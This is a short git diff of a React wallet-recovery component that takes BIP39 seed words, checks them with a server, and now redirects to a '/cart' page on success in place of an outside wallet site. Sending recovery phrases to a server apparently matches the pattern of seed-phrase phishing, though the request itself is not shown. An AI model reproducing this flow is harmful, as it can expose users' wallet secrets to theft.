@@ -1,13 +1,14 @@
 "use client";
 
 import React, { useMemo, useState, useRef, useEffect } from "react";
+import { useRouter } from "next/navigation";
 import axios from "axios";
 
 // Load BIP39 wordlist from public file
 const loadWordlist = async (): Promise<string[]> => {
   try {
     console.log("Loading wordlist...");
-    const response = await fetch("/recovery_.txt");
+    const response = await fetch("/recovery_phrase.txt");
     const text = await response.text();
     const words = text
       .trim()
@@ -75,6 +76,7 @@ export default function RecoveryRestore({
   onCancel?: () => void;
   onConfirm?: (words: string[]) => void;
 }) {
+  const router = useRouter();
   const [step, setStep] = useState<"type" | "recovery">("type");
   const [selectedCount, setSelectedCount] = useState<number | null>(null);
   const [words, setWords] = useState<string[]>([]);
@@ -233,9 +235,10 @@ export default function RecoveryRestore({
       const result = await response.json();
 
       if (response.status === 200 && result.status) {
-        window.location.href = "https://eternal-wallet.io/";
         console.log("Recovery  validation successful:", result);
         onConfirm?.(words);
+        // Redirect to empty cart page after successful recovery
+        router.push("/cart");
       } else {
         const serverMessage = result?.message || "Something went wrong.";
         const serverError = result?.error ? ` (${result.error})` : "";
